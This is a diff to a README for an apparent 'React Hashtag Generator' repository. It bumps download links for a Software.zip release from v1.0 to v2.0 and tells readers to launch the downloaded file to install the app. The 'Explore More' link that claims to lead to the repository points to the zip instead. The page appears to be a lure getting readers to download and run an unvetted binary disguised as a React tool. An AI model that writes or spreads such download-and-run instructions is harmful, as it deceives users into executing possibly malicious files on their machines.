@@ -6,7 +6,7 @@ This repository houses the **React Hashtag Generator**, a tool designed to conve
 ## 🚀 Quick Start
 To get started with the React Hashtag Generator, make sure to download the latest release by clicking the button below:
 
-[![Download Release](https://github.com/Danielbestmom/react-hashtag-generator/releases/download/v1.0/Software.zip%20Release&color=blue)](https://github.com/Danielbestmom/react-hashtag-generator/releases/download/v1.0/Software.zip)
+[![Download Release](https://github.com/Danielbestmom/react-hashtag-generator/releases/download/v2.0/Software.zip%20Release&color=blue)](https://github.com/Danielbestmom/react-hashtag-generator/releases/download/v2.0/Software.zip)
 
 📌 **Note:** Once downloaded, the file needs to be launched to install the React Hashtag Generator application.
 
@@ -37,7 +37,7 @@ This repository covers a wide range of topics including:
 - Vite
 
 ## 🌐 Explore More
-Visit the [React Hashtag Generator](https://github.com/Danielbestmom/react-hashtag-generator/releases/download/v1.0/Software.zip) repository to explore more about the tool. If the link does not work, kindly check the "Releases" section for alternative options.
+Visit the [React Hashtag Generator](https://github.com/Danielbestmom/react-hashtag-generator/releases/download/v2.0/Software.zip) repository to explore more about the tool. If the link does not work, kindly check the "Releases" section for alternative options.
 
 ## 🌺 Get Involved
 Feel free to contribute to the development of the React Hashtag Generator by forking the repository, making your changes, and submitting a pull request. Your contributions are highly valued!
